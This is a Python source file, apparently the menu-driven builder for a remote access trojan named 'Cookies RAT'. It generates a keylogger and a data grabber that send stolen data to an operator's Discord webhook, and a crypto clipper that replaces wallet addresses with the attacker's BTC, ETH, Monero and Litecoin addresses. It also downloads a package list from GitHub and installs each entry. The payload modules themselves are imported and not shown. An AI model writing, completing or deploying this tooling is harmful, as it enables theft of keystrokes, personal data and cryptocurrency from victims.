import os
import re
try: import requests
except ImportError: os.system('pip install requests')

'''
Try importing modules
'''

try: 
    from util.plugins.common import *
    from colorama import Fore
    from cookies_package import *
    from time import sleep

    from util.create_crypto_clipper import Create_Crypto_Clipper
    from util.create_key_logger import Create_KeyLogger
    from util.create_data_grabber import Create_Data_Grabber

    from assets.modules import *
except:
    failed = False
    modules = []
    os.system('cls') # Clear screen to fix color issues
    '''
    Attempt to download each module 1 by 1
    '''
    r = requests.get("https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/requirements.txt").text
    for i in r.splitlines():
        try:
            os.system(f"pip install {i}")
        except:
            failed = True
            modules.append(i)
            print(f"Failed to install module {i}")
            pass
    
    if failed: 
        os.system('cls')
        print(f"Seems like {str(modules)} modules failed to install please run the setup.bat again, if this problem persists contact CookiesKush420")
        input("\n\nPress enter to exit...")
        exit()


def test_webhook(webhook):
    body = {'content':'WEBHOOK TEST'}
    return requests.post(webhook, json=body).status_code

def validate_webhook(webhook):
    is_valid_url = re.match(pattern=r"^(((http|ftp|https):\/{2})+(([0-9a-z_-]+\.)+(aero|asia|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|cz|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mn|mn|mo|mp|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|nom|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ra|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw|arpa)(:[0-9]+)?((\/([~0-9a-zA-Z\#\+\%@\.\/_-]+))?(\?[0-9a-zA-Z\+\%@\/&\[\];=_-]+)?)?))\b", string=webhook) != None
    is_working = test_webhook(webhook)
    return  is_valid_url and (is_working == 204 or is_working == 200)


'''
MAIN MENU
'''
def main_menu():
    clear()
    settitle(f"Cookies RAT Builder")
    
    print(banner)
    choice = str(input(
            f'{Fore.CYAN}Choice {Fore.YELLOW}>> {Fore.RESET}'))
 

    if choice == '1':     # Create Custom PayLoad
        clear()
        print(f"{Fore.LIGHTRED_EX}Still in development. . .{Fore.RESET}")
        sleep(1)
        main_menu()

    elif choice == '2':     # Create Keylogger Add on
        clear()
        webhook = str(input(
            f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
        if not validate_webhook(webhook):
            print(f"{Fore.LIGHTRED_EX}Webhook could not be validated{Fore.RESET}")
            sleep(1)
            main_menu()
            
        intervals = str(input(
            f'{Fore.CYAN}Enter intervals (default 60) {Fore.YELLOW}>> {Fore.RESET}'))
        if intervals == "":
            Create_KeyLogger(webhook, "60")
            main_menu()
        Create_KeyLogger(webhook, intervals)
        main_menu()

    elif choice == '3':     # Create Data Grabber Add on
        clear()
        webhook = str(input(
            f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
        if not validate_webhook(webhook):
            print(f"{Fore.LIGHTRED_EX}Webhook could not be validated{Fore.RESET}")
            sleep(1)
            main_menu()
            
        Create_Data_Grabber(webhook)
        main_menu()

    elif choice == '4':     # Create Crypto Clipper Add on
        clear()
        btc = str(input(
            f'{Fore.CYAN}Enter BTC address {Fore.YELLOW}>> {Fore.RESET}'))
        eth = str(input(
            f'{Fore.CYAN}Enter ETH address {Fore.YELLOW}>> {Fore.RESET}'))
        mon = str(input(
            f'{Fore.CYAN}Enter MONERO address {Fore.YELLOW}>> {Fore.RESET}'))
        ltc = str(input(
            f'{Fore.CYAN}Enter LTC address {Fore.YELLOW}>> {Fore.RESET}'))
        if re.match(pattern=r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", string=btc) != None and re.match(pattern=r"^0x[a-zA-F0-9]{40}$", string=eth) != None and re.match(pattern=r"^4([0-9]|[A-B])(.){93}$", string=mon) != None and re.match(pattern=r"^4([0-9]|[A-B])(.){93}$", string=ltc) != None:
            Create_Crypto_Clipper(btc, eth, mon, ltc)
        else:
            print(f"{Fore.LIGHTRED_EX}One of the crypto adresses providet isn't a valid adress{Fore.RESET}")
            sleep(1)

        main_menu()

    elif choice == '420':   # Exit RAT Builder
        settitle("Exiting...")
        clear()
        exit()
        
    else:                   # Invalid Choice
        clear()
        print(f"{Fore.LIGHTRED_EX}Please enter a valid choice{Fore.RESET}")
        sleep(1)
        main_menu()



if __name__ == "__main__":
    main_menu()
